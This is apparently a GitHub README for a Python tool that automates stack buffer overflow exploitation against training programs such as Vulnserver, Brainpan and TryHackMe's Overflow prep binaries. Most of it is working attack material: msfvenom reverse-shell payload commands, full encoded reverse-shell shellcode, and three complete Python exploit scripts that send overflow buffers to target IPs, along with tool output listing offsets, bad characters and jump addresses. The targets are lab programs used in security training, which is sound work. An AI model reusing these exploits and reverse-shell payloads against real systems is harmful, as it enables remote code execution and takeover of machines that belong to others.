# BOF-Roaster

BOF-Roaster is an automated buffer overflow exploit machine which is begin written with Python 3. On first release it was able to successfully break many of the most well-known buffer overflow example executables. Which are 

1-Brainpan

2-Vulnserver

3-Dostackbufferoverflowgood

4-bufferoverflowprep from TryHackMe

Still in progress.

## Installation

To use this project first you have to install 32 bit radare2 binary in your windows computer. From [here](https://github.com/radareorg/radare2/releases), and add it to path variables. You can follow [these](https://www.mathworks.com/matlabcentral/answers/94933-how-do-i-edit-my-system-path-in-windows) steps. And you have to install r2pipe library.
```bash
pip install r2pipe
```

## TODO

Calculating offset between EIP and ESP register is missing, for the moment we have to give it from command line.

Finding proper ```jmp esp``` address is not ok currently.

## Usage

```bash
 python .\main.py --ip 127.0.0.1 --port <RUNNING-PORT> --vuln_exe <PATH OF EXECUTABLE>  
   --fuzz_counter <FUZZING INCREASE COUNTER> --prefix <PREFIX BEFORE SHELLCODE> --output <OUTPUT OF POC EXPLOIT>
```
For example:
```bash
 python .\main.py --ip 127.0.0.1 --port 1337 --vuln_exe .\example_exes\oscp.exe 
    --vuln_dll .\example_exes\essfunc.dll  --fuzz_counter 300 --prefix "OVERFLOW3 " --output overflow3_poc.py
```
In this case executable is [oscp.exe](https://tryhackme.com/room/bufferoverflowprep) executable also need  for dll, ```essfunc.dll``` is dll of that exe. fuzz_counter is 300 so it will fuzz with "A" increasing count by ```300```. Prefix is ```"OVERFLOW3 "``` so it means executable is vulnerable if we write ```OVERFLOW3 ``` in the first place. ```overflow3_poc.py``` is the name of the file for our poc executable.

## Examples

Different vulnerable executables used for example.

### 1 - Vulnserver
Executable program link is [here](https://github.com/stephenbradshaw/vulnserver).


 Run program like this: 
```bash
python .\main.py --ip 192.168.1.21 --port 9999 --vuln_exe example_exes\vulnserver\vulnserver.exe 
 --vuln_dll example_exes\vulnserver\essfunc.dll --prefix 'TRUN /.:/' --fuzz_counter 700
```
and output is: 
```
Fuzzing with 700 bytes
Fuzzing with 1400 bytes
Fuzzing with 2100 bytes
Fuzzing crashed at 2100 bytes
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  2003 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00'
Linux:         msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00'
```
So at the end we were able to find offset ```2003```, badchars ```\x00``` only in this case. Proper ```jmp esp``` address which is  ```\xaf\x11\x50\x62``` and our POC exploit file is written under ```exploit_poc.py``` file. We just have to change ```buf``` variable with our shellcode. And we can create shellcode with given ```msfvenom``` command. Output of that msfvenom command is:
```bash
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.61 LPORT=8080 -f py -b '\x00' 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xba\x60\x42\xe1\xcb\xda\xc6\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x52\x31\x57\x12\x83\xc7\x04\x03\x37\x4c\x03"
buf += b"\x3e\x4b\xb8\x41\xc1\xb3\x39\x26\x4b\x56\x08\x66\x2f"
buf += b"\x13\x3b\x56\x3b\x71\xb0\x1d\x69\x61\x43\x53\xa6\x86"
buf += b"\xe4\xde\x90\xa9\xf5\x73\xe0\xa8\x75\x8e\x35\x0a\x47"
buf += b"\x41\x48\x4b\x80\xbc\xa1\x19\x59\xca\x14\x8d\xee\x86"
buf += b"\xa4\x26\xbc\x07\xad\xdb\x75\x29\x9c\x4a\x0d\x70\x3e"
buf += b"\x6d\xc2\x08\x77\x75\x07\x34\xc1\x0e\xf3\xc2\xd0\xc6"
buf += b"\xcd\x2b\x7e\x27\xe2\xd9\x7e\x60\xc5\x01\xf5\x98\x35"
buf += b"\xbf\x0e\x5f\x47\x1b\x9a\x7b\xef\xe8\x3c\xa7\x11\x3c"
buf += b"\xda\x2c\x1d\x89\xa8\x6a\x02\x0c\x7c\x01\x3e\x85\x83"
buf += b"\xc5\xb6\xdd\xa7\xc1\x93\x86\xc6\x50\x7e\x68\xf6\x82"
buf += b"\x21\xd5\x52\xc9\xcc\x02\xef\x90\x98\xe7\xc2\x2a\x59"
buf += b"\x60\x54\x59\x6b\x2f\xce\xf5\xc7\xb8\xc8\x02\x27\x93"
buf += b"\xad\x9c\xd6\x1c\xce\xb5\x1c\x48\x9e\xad\xb5\xf1\x75"
buf += b"\x2d\x39\x24\xd9\x7d\x95\x97\x9a\x2d\x55\x48\x73\x27"
buf += b"\x5a\xb7\x63\x48\xb0\xd0\x0e\xb3\x53\xd5\xc7\xb8\x9e"
buf += b"\x81\xd5\xbe\xff\xc1\x53\x58\x95\xf1\x35\xf3\x02\x6b"
buf += b"\x1c\x8f\xb3\x74\x8a\xea\xf4\xff\x39\x0b\xba\xf7\x34"
buf += b"\x1f\x2b\xf8\x02\x7d\xfa\x07\xb9\xe9\x60\x95\x26\xe9"
buf += b"\xef\x86\xf0\xbe\xb8\x79\x09\x2a\x55\x23\xa3\x48\xa4"
buf += b"\xb5\x8c\xc8\x73\x06\x12\xd1\xf6\x32\x30\xc1\xce\xbb"
buf += b"\x7c\xb5\x9e\xed\x2a\x63\x59\x44\x9d\xdd\x33\x3b\x77"
buf += b"\x89\xc2\x77\x48\xcf\xca\x5d\x3e\x2f\x7a\x08\x07\x50"
buf += b"\xb3\xdc\x8f\x29\xa9\x7c\x6f\xe0\x69\x8c\x3a\xa8\xd8"
buf += b"\x05\xe3\x39\x59\x48\x14\x94\x9e\x75\x97\x1c\x5f\x82"
buf += b"\x87\x55\x5a\xce\x0f\x86\x16\x5f\xfa\xa8\x85\x60\x2f"
```
So we can basically copy that buf variable and paste that in our code. And we are done. At the end our script will be:
```python
import socket
prefix = 'TRUN /.:/'
filler = 2003 * "A" 
eip = '\xaf\x11\x50\x62'
offset = 10 * ""
buf =  b""
buf += b"\xba\x60\x42\xe1\xcb\xda\xc6\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x52\x31\x57\x12\x83\xc7\x04\x03\x37\x4c\x03"
buf += b"\x3e\x4b\xb8\x41\xc1\xb3\x39\x26\x4b\x56\x08\x66\x2f"
buf += b"\x13\x3b\x56\x3b\x71\xb0\x1d\x69\x61\x43\x53\xa6\x86"
buf += b"\xe4\xde\x90\xa9\xf5\x73\xe0\xa8\x75\x8e\x35\x0a\x47"
buf += b"\x41\x48\x4b\x80\xbc\xa1\x19\x59\xca\x14\x8d\xee\x86"
buf += b"\xa4\x26\xbc\x07\xad\xdb\x75\x29\x9c\x4a\x0d\x70\x3e"
buf += b"\x6d\xc2\x08\x77\x75\x07\x34\xc1\x0e\xf3\xc2\xd0\xc6"
buf += b"\xcd\x2b\x7e\x27\xe2\xd9\x7e\x60\xc5\x01\xf5\x98\x35"
buf += b"\xbf\x0e\x5f\x47\x1b\x9a\x7b\xef\xe8\x3c\xa7\x11\x3c"
buf += b"\xda\x2c\x1d\x89\xa8\x6a\x02\x0c\x7c\x01\x3e\x85\x83"
buf += b"\xc5\xb6\xdd\xa7\xc1\x93\x86\xc6\x50\x7e\x68\xf6\x82"
buf += b"\x21\xd5\x52\xc9\xcc\x02\xef\x90\x98\xe7\xc2\x2a\x59"
buf += b"\x60\x54\x59\x6b\x2f\xce\xf5\xc7\xb8\xc8\x02\x27\x93"
buf += b"\xad\x9c\xd6\x1c\xce\xb5\x1c\x48\x9e\xad\xb5\xf1\x75"
buf += b"\x2d\x39\x24\xd9\x7d\x95\x97\x9a\x2d\x55\x48\x73\x27"
buf += b"\x5a\xb7\x63\x48\xb0\xd0\x0e\xb3\x53\xd5\xc7\xb8\x9e"
buf += b"\x81\xd5\xbe\xff\xc1\x53\x58\x95\xf1\x35\xf3\x02\x6b"
buf += b"\x1c\x8f\xb3\x74\x8a\xea\xf4\xff\x39\x0b\xba\xf7\x34"
buf += b"\x1f\x2b\xf8\x02\x7d\xfa\x07\xb9\xe9\x60\x95\x26\xe9"
buf += b"\xef\x86\xf0\xbe\xb8\x79\x09\x2a\x55\x23\xa3\x48\xa4"
buf += b"\xb5\x8c\xc8\x73\x06\x12\xd1\xf6\x32\x30\xc1\xce\xbb"
buf += b"\x7c\xb5\x9e\xed\x2a\x63\x59\x44\x9d\xdd\x33\x3b\x77"
buf += b"\x89\xc2\x77\x48\xcf\xca\x5d\x3e\x2f\x7a\x08\x07\x50"
buf += b"\xb3\xdc\x8f\x29\xa9\x7c\x6f\xe0\x69\x8c\x3a\xa8\xd8"
buf += b"\x05\xe3\x39\x59\x48\x14\x94\x9e\x75\x97\x1c\x5f\x82"
buf += b"\x87\x55\x5a\xce\x0f\x86\x16\x5f\xfa\xa8\x85\x60\x2f"
endfix = ''
ip = '10.10.132.141'
port = 9999
buffer = bytes(prefix, "latin-1") + bytes(filler, "latin-1") + bytes(eip, "latin-1") +  bytes(offset, "latin-1") + buf + bytes(endfix, "latin-1")
timeout = 5
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        s.send(buffer)
        s.recv(1024)
except:
    pass
```

### 2 - Dostackbufferoverflowgood

Executable & walktrough repository is [here](https://github.com/justinsteven/dostackbufferoverflowgood).


 Run program like this: 
```bash
 python .\main.py --ip 127.0.0.1 --port 31337 --vuln_exe example_exes\dostackbufferoverflowgood\dostackbufferoverflowgood.exe  --fuzz_counter 100
```
and output is: 
```
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing crashed at 200 bytes
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  146 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\x0a
[ * ] Found proper 'jmp esp' address to use. Address:  \xc3\x14\x04\x08
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x0a'
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x0a'
```
So at the end we were able to find offset ```146```, badchars ```\x00\x0a``` in this case. Proper ```jmp esp``` address which is  ```\xc3\x14\x04\x08``` and our POC exploit file is written under ```exploit_poc.py``` file. We just have to change ```buf``` variable with our shellcode. And we can create shellcode with given ```msfvenom``` command. After copy pasting msfvenom output our exploit will be ready. Latest script is like:
```python
import socket
prefix = ''
filler = 146 * "A" 
eip = '\xc3\x14\x04\x08'
offset = 10 * ""
buf =  b""
buf += b"\xda\xd1\xba\xb3\x84\xbf\x84\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xe5\x97\x5d"
buf += b"\x71\xf5\x70\x23\x7a\x05\x81\x44\xf2\xe0\xb0\x44\x60"
buf += b"\x61\xe2\x74\xe2\x27\x0f\xfe\xa6\xd3\x84\x72\x6f\xd4"
buf += b"\x2d\x38\x49\xdb\xae\x11\xa9\x7a\x2d\x68\xfe\x5c\x0c"
buf += b"\xa3\xf3\x9d\x49\xde\xfe\xcf\x02\x94\xad\xff\x27\xe0"
buf += b"\x6d\x74\x7b\xe4\xf5\x69\xcc\x07\xd7\x3c\x46\x5e\xf7"
buf += b"\xbf\x8b\xea\xbe\xa7\xc8\xd7\x09\x5c\x3a\xa3\x8b\xb4"
buf += b"\x72\x4c\x27\xf9\xba\xbf\x39\x3e\x7c\x20\x4c\x36\x7e"
buf += b"\xdd\x57\x8d\xfc\x39\xdd\x15\xa6\xca\x45\xf1\x56\x1e"
buf += b"\x13\x72\x54\xeb\x57\xdc\x79\xea\xb4\x57\x85\x67\x3b"
buf += b"\xb7\x0f\x33\x18\x13\x4b\xe7\x01\x02\x31\x46\x3d\x54"
buf += b"\x9a\x37\x9b\x1f\x37\x23\x96\x42\x50\x80\x9b\x7c\xa0"
buf += b"\x8e\xac\x0f\x92\x11\x07\x87\x9e\xda\x81\x50\xe0\xf0"
buf += b"\x76\xce\x1f\xfb\x86\xc7\xdb\xaf\xd6\x7f\xcd\xcf\xbc"
buf += b"\x7f\xf2\x05\x12\x2f\x5c\xf6\xd3\x9f\x1c\xa6\xbb\xf5"
buf += b"\x92\x99\xdc\xf6\x78\xb2\x77\x0d\xeb\xb7\x8e\x0e\xd6"
buf += b"\xaf\x92\x10\x29\x8b\x1a\xf6\x43\xfb\x4a\xa1\xfb\x62"
buf += b"\xd7\x39\x9d\x6b\xcd\x44\x9d\xe0\xe2\xb9\x50\x01\x8e"
buf += b"\xa9\x05\xe1\xc5\x93\x80\xfe\xf3\xbb\x4f\x6c\x98\x3b"
buf += b"\x19\x8d\x37\x6c\x4e\x63\x4e\xf8\x62\xda\xf8\x1e\x7f"
buf += b"\xba\xc3\x9a\xa4\x7f\xcd\x23\x28\x3b\xe9\x33\xf4\xc4"
buf += b"\xb5\x67\xa8\x92\x63\xd1\x0e\x4d\xc2\x8b\xd8\x22\x8c"
buf += b"\x5b\x9c\x08\x0f\x1d\xa1\x44\xf9\xc1\x10\x31\xbc\xfe"
buf += b"\x9d\xd5\x48\x87\xc3\x45\xb6\x52\x40\x75\xfd\xfe\xe1"
buf += b"\x1e\x58\x6b\xb0\x42\x5b\x46\xf7\x7a\xd8\x62\x88\x78"
buf += b"\xc0\x07\x8d\xc5\x46\xf4\xff\x56\x23\xfa\xac\x57\x66"
endfix = '\r\n'
ip = '10.10.150.201'
port = 31337
buffer =  bytes(filler, "latin-1") + bytes(eip, "latin-1") +  bytes(offset, "latin-1") + buf + bytes(endfix, "latin-1")
timeout = 5
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(buffer)
        s.recv(1024)
except:
    pass
```

### 3 - Brainpan 1
Link for brainpan1 exe and whole machine is [here](https://www.vulnhub.com/entry/brainpan-1,51).

 Run program like this: 
```bash
 python .\main.py --ip 127.0.0.1 --port 9999 --vuln_exe example_exes\brainpan.exe  --fuzz_counter 100
```
and output is: 
```
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing crashed at 700 bytes
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  524 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00
[ * ] Found proper 'jmp esp' address to use. Address:  \xf3\x12\x17\x31
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it. 
[ * ] You can generate shellcode with using this command with proper IP and PORT. 
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00'
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00'   
```
So at the end we were able to find offset ```524```, badchars ```\x00``` in this case. Proper ```jmp esp``` address which is  ```\xf3\x12\x17\x31``` and our POC exploit file is written under ```exploit_poc.py``` file. We just have to change ```buf``` variable with our shellcode. And we can create shellcode with given ```msfvenom``` command. After copy pasting msfvenom output our exploit will be ready. Latest script is like:
```python
import socket
prefix = ''
filler = 524 * "A"
eip = '\xf3\x12\x17\x31'
offset = 10 * ""
buf =  b""
buf += b"\xdb\xdc\xbf\x8e\x25\xac\x67\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x12\x31\x7a\x17\x03\x7a\x17\x83\x4c\x21\x4e"
buf += b"\x92\x61\xf1\x79\xbe\xd2\x46\xd5\x2b\xd6\xc1\x38\x1b"
buf += b"\xb0\x1c\x3a\xcf\x65\x2f\x04\x3d\x15\x06\x02\x44\x7d"
buf += b"\x59\x5c\xb7\x69\x31\x9f\xb8\x90\x7a\x16\x59\x22\x1a"
buf += b"\x79\xcb\x11\x50\x7a\x62\x74\x5b\xfd\x26\x1e\x0a\xd1"
buf += b"\xb5\xb6\xba\x02\x15\x24\x52\xd4\x8a\xfa\xf7\x6f\xad"
buf += b"\x4a\xfc\xa2\xae"
endfix = "\r\n"
ip = '192.168.1.26'
port = 9999
buffer = bytes(prefix, "latin-1") + bytes(filler, "latin-1") + bytes(eip, "latin-1") +  bytes(offset, "latin-1") + buf + bytes(endfix, "latin-1")
timeout = 5
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(buffer)
        s.recv(1024)
except:
    pass    
```


### 4 - TryHackMe Bufferoverflow Prep 
https://tryhackme.com/room/bufferoverflowprep

https://medium.com/swlh/tryhackme-buffer-overflow-prep-9b2ece17a13c

#### Overflow1 
```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  1978 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\x07\x2e\xa0
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x07\x2e\xa0'  
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x07\x2e\xa0'
```

#### Overflow2
For overflow2 as i  see also with immunity debugger and with radare2 overwritten EIP is broken.

This is from radare2
```
(5324) Fatal Exception C0000005 (EXCEPTION_ACCESS_VIOLATION) in thread 23708
Hint: Use 'dce' continue into exception handler
[0x76413177]> dr
edi = 0x00401973
esi = 0x00401974
ebx = 0x39754138
edx = 0x00000000
ecx = 0x00805c2c
eax = 0x02cff755
ebp = 0x41307641
eip = 0x76413177
eflags = 0x00010246
esp = 0x02cffa18
[0x76413177]>
```
And it shows that eip is 76413177 but it should be 76413176
```
┌──(kaancaglan㉿kaancaglan)-[~]
└─$ msf-pattern_offset -l 1000 -q 76413177
[*] No exact matches, looking for likely candidates...
[+] Possible match at offset 634 (adjusted [ little-endian: 1 | big-endian: 1044481 ] ) byte offset 0
[+] Possible match at offset 664 (adjusted [ little-endian: -16777216 | big-endian: -15732736 ] ) byte offset 3
                                                                                                                                                                                                                                              
┌──(kaancaglan㉿kaancaglan)-[~]
└─$ msf-pattern_offset -l 1000 -q 76413176                                                                                                                                                                                                1 ⨯
[*] Exact match at offset 634
```
I don't know this one. Its on my TODO list for now.

#### Overflow3
```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  1274 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\x11\x40\x5f\xb8\xee
[ - ] ESP:  0x625011af  failed.
[ - ] ESP:  0x625011bb  failed.
[ - ] ESP:  0x625011c7  failed.
[ - ] ESP:  0x625011d3  failed.
[ - ] ESP:  0x625011df  failed.
[ - ] ESP:  0x625011eb  failed.
[ - ] ESP:  0x625011f7  failed.
[ * ] Found proper 'jmp esp' address to use. Address:  \x03\x12\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x11\x40\x5f\xb8\xee' 
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x11\x40\x5f\xb8\xee' 
```

#### Overflow4

```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  2026 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\xa9\xcd\xd4
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\xa9\xcd\xd4'
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\xa9\xcd\xd4'
```

#### Overflow5
```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  314 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\x16\x2f\xf4\xfd
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x16\x2f\xf4\xfd'
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x16\x2f\xf4\xfd'
```

#### Overflow6
```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  1034 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\x08\x2c\xad
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x08\x2c\xad'  
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x08\x2c\xad
```

#### Overflow7
```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  1306 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\x8c\xae\xbe\xfb
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x8c\xae\xbe\xfb'
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x8c\xae\xbe\xfb'
```

#### Overflow8
```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  1786 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\x1d\x2e\xc7\xee
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x1d\x2e\xc7\xee'  
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x1d\x2e\xc7\xee'
```
#### Overflow9
```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  1514 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\x04\x3e\x3f\xe1
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x04\x3e\x3f\xe1'
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\x04\x3e\x3f\xe1
```

#### Overflow10
```
[ * ] Program crashed with initial buffer. EIP register is overwritten with:  0x41414141
[ * ] Offset is:  537 . EIP Register is successfuly overwritten with:  0x42424242
... Founding bad chars!
[ * ] All badchars are found!:   \x00\xa0\xad\xbe\xde\xef
[ * ] Found proper 'jmp esp' address to use. Address:  \xaf\x11\x50\x62
[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.
[ * ] You can generate shellcode with using this command with proper IP and PORT.
Windows:        msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\xa0\xad\xbe\xde\xef'        
Linux:          msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00\xa0\xad\xbe\xde\xef'
```

